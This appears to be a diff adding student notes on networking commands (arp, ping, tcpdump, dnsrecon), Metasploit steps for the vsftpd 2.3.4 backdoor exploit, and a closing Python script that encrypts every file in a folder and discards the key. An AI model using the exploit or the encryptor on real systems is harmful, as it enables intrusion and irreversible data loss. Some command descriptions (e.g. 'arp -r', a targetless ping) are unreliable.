@@ -1,0 +1,248 @@
+Networking commands help us check internet connection, find IP addresses, and fix network problems. Below are some common commands and what they do.
+
+ARP Command
+arp -r
+This clears the ARP cache. It removes saved IP and MAC address entries.
+
+arp -a
+This shows the current ARP table.
+
+arp -d <ip>
+This deletes the ARP entry for a specific IP address.
+
+Ping Command
+ping -c 55
+This sends 55 ping packets to check if a system is reachable.
+
+ping -c 4 google.com
+This sends 4 ping packets to google.com.
+
+ping -i 2 google.com
+This sends ping packets every 2 seconds.
+
+Host Command
+host google.com
+This finds the IP address of a website using DNS.
+
+# ===============================
+# ARP (Address Resolution Protocol) Commands
+# ===============================
+
+arp -r
+# Clears (removes) all saved IP-to-MAC address entries from ARP cache
+
+arp -a
+# Shows the current ARP table (list of IP and MAC addresses stored)
+
+arp -d 192.168.1.10
+# Deletes the ARP entry for a specific IP address
+
+
+# ===============================
+# Ping Commands
+# ===============================
+
+ping -c 55
+# Sends 55 ping packets to the default target (Linux requires a destination like google.com)
+
+ping -c 4 google.com
+# Sends 4 ping packets to google.com and then stops
+
+ping -i 2 google.com
+# Sends ping packets to google.com every 2 seconds
+
+
+# ===============================
+# Host Command
+# ===============================
+
+host google.com
+# Finds the IP address of google.com (DNS lookup)
+
+Basic Packet Capture and DNS Commands
+These commands are used to capture network traffic and collect DNS information. They are useful for network monitoring and troubleshooting.
+
+1️⃣ sudo tcpdump -w file1.pcap
+This command captures network packets and saves them into a file named file1.pcap.
+You can open this file later using tools like Wireshark.
+
+sudo → runs the command with admin permission
+
+-w → writes output to a file
+
+2️⃣ sudo tcpdump -r file1.pcap
+This reads and displays packets from a saved capture file.
+
+-r → reads packets from a file
+3️⃣ sudo tcpdump host <ip> and tcp port 80
+This captures only TCP traffic on port 80 (HTTP) for a specific IP address.
+
+Example:
+
+sudo tcpdump host 192.168.1.10 and tcp port 80
+
+4️⃣ sudo tcpdump host <ip> -c 10
+This captures only 10 packets from a specific IP address.
+
+-c 10 → stops after capturing 10 packets
+5️⃣ sudo tcpdump udp
+This captures only UDP traffic.
+
+UDP is used for DNS, streaming, and some online games.
+
+6️⃣ sudo tcpdump portrange 50-100
+This captures traffic for ports between 50 and 100.
+
+Useful when checking activity in a range of ports.
+
+7️⃣ sudo tcpdump "tcp port 80 or udp port 63"
+This captures traffic on:
+
+TCP port 80
+
+OR UDP port 63
+
+It filters two conditions together.
+
+8️⃣ dnsrecon -d google.com
+This performs DNS reconnaissance on a domain.
+
+It finds:
+
+Name servers
+
+Subdomains
+
+DNS records
+
+9️⃣ dnsrecon -r <ip>
+This performs reverse DNS lookup for an IP range.
+
+Example:
+
+dnsrecon -r 192.168.1.0/24
+
+It finds domain names linked to IP addresses.
+
+🔟 sudo tcpdump -X udp
+This captures UDP traffic and shows packet data in both:
+
+Hex format
+
+ASCII format
+
+-X → shows packet content in detail
+
+These commands are commonly used in cybersecurity, ethical hacking, and network troubleshooting.
+
+# ===============================
+# TCPDUMP COMMANDS (Packet Capture)
+# ===============================
+
+sudo tcpdump -w file1.pcap
+# Captures network packets and saves them into a file named file1.pcap
+# -w means write output to a file
+# sudo is needed for admin permission
+
+
+sudo tcpdump -r file1.pcap
+# Reads and displays packets from the saved file file1.pcap
+# -r means read from file
+
+
+sudo tcpdump host 192.168.1.10 and tcp port 80
+# Captures only TCP traffic on port 80 (HTTP) for the given IP address
+# host filters traffic for that IP
+# tcp port 80 filters only HTTP traffic
+
+
+sudo tcpdump host 192.168.1.10 -c 10
+# Captures only 10 packets from the given IP address
+# -c 10 stops capture after 10 packets
+
+
+sudo tcpdump udp
+# Captures only UDP traffic
+# UDP is used for DNS, streaming, etc.
+
+
+sudo tcpdump portrange 50-100
+# Captures traffic for ports between 50 and 100
+
+
+sudo tcpdump "tcp port 80 or udp port 63"
+# Captures traffic on TCP port 80 OR UDP port 63
+# "or" allows multiple conditions
+
+
+sudo tcpdump -X udp
+# Captures UDP traffic and shows packet data in Hex and ASCII format
+# -X displays detailed packet content
+
+
+# ===============================
+# DNSRECON COMMANDS (DNS Information)
+# ===============================
+
+dnsrecon -d google.com
+# Performs DNS lookup on the domain google.com
+# Finds name servers, subdomains, and DNS records
+
+
+dnsrecon -r 192.168.1.0/24
+# Performs reverse DNS lookup on an IP range
+# Finds domain names linked to those IP addresses
+
+Using Metasploit to Run an Exploit
+Metasploit is a popular tool used in cybersecurity and ethical hacking. It helps security professionals test systems for weaknesses. One of the main programs in Metasploit is msfconsole.
+
+1️⃣ msfconsole
+This command starts the Metasploit Framework.
+When you type this in the terminal, the Metasploit console opens.
+From there, you can search for exploits, configure them, and run them.
+
+2️⃣ use exploit/unix/ftp/vsftpd_234_backdoor
+This command selects a specific exploit inside Metasploit.
+
+In this case:
+
+exploit/unix/ftp/ means it targets an FTP service running on a Unix system.
+
+vsftpd_234_backdoor is a known vulnerability in version 2.3.4 of the VSFTPD FTP server.
+
+This exploit is used to test systems that have this vulnerable version installed.
+
+3️⃣ set RHOST 192.168.45.135
+This command sets the target IP address.
+
+RHOST means Remote Host.
+
+192.168.45.135 is the IP address of the target machine.
+
+This tells Metasploit which system to attack.
+
+4️⃣ exploit
+This command runs the exploit.
+
+After typing this, Metasploit tries to use the selected vulnerability on the target system.
+If the system is vulnerable, it may open a session or give access.
+
+Program to encrypt all files in a dir
+
+from cryptography.fernet import Fernet
+import os
+
+folder_path="/home/kali/family"
+files=os.listdir(folder_path)
+key=Fernet.generate_key()
+cipher=Fernet(key)
+print(cipher)
+for a in files:
+    full_path=os.path.join(folder_path,a)
+    with open(full_path,"rb") as file:
+        data=file.read()
+
+    encrypted_data=cipher.encrypt(data)
+
+    with open(full_path,"wb") as file:
+        file.write(encrypted_data)
